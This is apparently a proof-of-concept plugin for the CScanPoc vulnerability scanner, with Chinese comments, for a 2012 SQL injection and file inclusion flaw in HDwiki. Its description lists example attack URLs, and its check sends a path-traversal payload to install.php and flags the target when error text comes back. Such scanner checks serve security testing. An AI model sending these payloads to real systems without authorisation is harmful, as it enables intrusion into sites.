# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'HDwiki_0101'  # 平台漏洞编号
    name = 'HDwiki某SQL注射和文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2012-04-02'  # 漏洞公布时间
    desc = '''
    官方的案例：
    SQL注射
    http://wiki.madio.net/index.php?doc-summary-xxxxxxxxx%27
    文件包含
    http://gmanxin.baike.com/install/install.php?lang=888888888888/..
    此文件包含在某些环境下可以截断利用。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=5619'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'HDwiki'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6df28d4a-56f7-4445-bc42-32858afe8917'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/install/install.php?lang=888888888888/.."
            url = self.target + payload
            respose = requests.get(url)
            if "SQL" in respose.text or "HDwiki Error Info" in respose.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
